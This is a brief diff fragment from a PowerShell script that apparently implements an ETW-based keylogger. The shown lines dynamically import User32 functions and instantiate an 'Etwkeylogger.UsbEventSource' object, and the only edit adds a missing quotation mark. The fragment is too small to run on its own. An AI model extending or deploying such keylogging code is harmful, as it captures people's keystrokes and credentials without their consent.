@@ -63,7 +63,7 @@ jLgFXNTN9za8LLB0d5fAUtItjXRId3cunQIipRIKSEoIktItJYICIp0iJUiXtCD5fhe479+P//95n/fd
         $ImportDll = $TypeBuilder.CreateType()
     }
 
-    "User32 functions imported.`n
+    "User32 functions imported.`n"
     try
     {
         $ETWLogger = New-Object Etwkeylogger.UsbEventSource
